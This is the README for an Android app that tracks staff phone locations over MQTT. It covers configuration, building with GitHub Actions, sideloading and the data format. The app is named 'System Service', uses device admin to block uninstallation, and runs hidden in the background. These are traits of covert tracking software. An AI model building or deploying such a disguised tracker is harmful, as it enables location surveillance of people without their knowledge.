# GPS Tracking App

A lightweight Android app for tracking staff device locations via MQTT.

## Features

- Continuous GPS tracking
- MQTT data transmission
- Auto-start on device boot
- Runs in background as foreground service
- Device admin for uninstall prevention
- Uses MAC address as device ID

## Quick Start

### 1. Configure MQTT Settings

Edit `app/src/main/java/com/system/service/Config.java` with your MQTT broker details:

```java
public static final String MQTT_BROKER_URL = "tcp://your-mqtt-broker.com:1883";
public static final String MQTT_USERNAME = "your_username";
public static final String MQTT_PASSWORD = "your_password";
public static final String MQTT_TOPIC = "gps/location";
```

See `config.md` for detailed configuration instructions.

### 2. Build the APK (Using GitHub Actions - FREE)

1. Create a GitHub repository
2. Push this code to the repository:
   ```bash
   git init
   git add .
   git commit -m "Initial commit"
   git branch -M main
   git remote add origin https://github.com/YOUR_USERNAME/YOUR_REPO.git
   git push -u origin main
   ```

3. GitHub Actions will automatically build the APK
4. Download the APK from:
   - Actions tab → Latest workflow run → Artifacts → "app-release"
   - OR Releases section (automatic releases)

### 3. Install on Staff Phones

1. Transfer the APK to the phone
2. Enable "Unknown Sources" in Settings
3. Install and grant all permissions
4. App will run in background automatically

## How It Works

1. **GPS Tracking**: Uses Google Play Services for high-accuracy location
2. **MQTT**: Publishes location data every 5 minutes (configurable)
3. **Device ID**: Uses MAC address (lowercase, no dashes)
4. **Persistence**: Auto-starts on boot, runs as foreground service
5. **Protection**: Device admin prevents easy removal

## Data Format

```json
{
  "device_id": "a1b2c3d4e5f6",
  "latitude": -33.5873,
  "longitude": 22.19503,
  "timestamp": "2025-11-17T14:18:36"
}
```

## Uninstalling

To uninstall the app:
1. Go to Settings → Security → Device Administrators
2. Disable "System Service"
3. Go to Settings → Apps → System Service → Uninstall

## Requirements

- Android 7.0 (API 24) or higher
- Google Play Services
- Internet connection
- MQTT broker

## Legal Notice

This app is designed for company-owned devices with employee consent. Ensure compliance with local privacy laws and obtain proper authorization before deployment.

## Troubleshooting

### App not tracking location
- Check location permissions are granted (Always)
- Verify battery optimization is disabled
- Check MQTT broker is accessible

### Can't build APK
- Ensure GitHub Actions has proper permissions
- Check Java/Gradle versions in workflow
- Verify all files are committed to repository

### Device ID not showing MAC address
- Android 10+ restricts MAC access
- App will use Android ID as fallback
- Format: `device_<androidid>`

## Support

For issues or questions, check the configuration guide in `config.md`.
